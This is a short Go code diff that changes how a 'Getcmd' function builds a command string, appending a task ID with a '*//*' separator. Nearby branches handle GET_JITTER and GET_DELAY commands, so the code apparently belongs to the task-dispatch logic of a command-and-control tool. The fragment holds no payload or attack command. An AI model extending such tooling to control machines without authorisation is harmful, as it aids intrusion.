@@ -2464,7 +2464,7 @@ func Getcmd(uid, cmd, Taskid string) string {
 			if len(parts) < 2 || parts[1] == "" {
 		        return "missing parameter"
 		    }
-			finalCmd = cmd
+			finalCmd = cmd + "*//*" + Taskid
 		}
 
     } else if strings.HasPrefix(cmd, "GET_JITTER*//*") || strings.HasPrefix(cmd, "GET_DELAY*//*") {
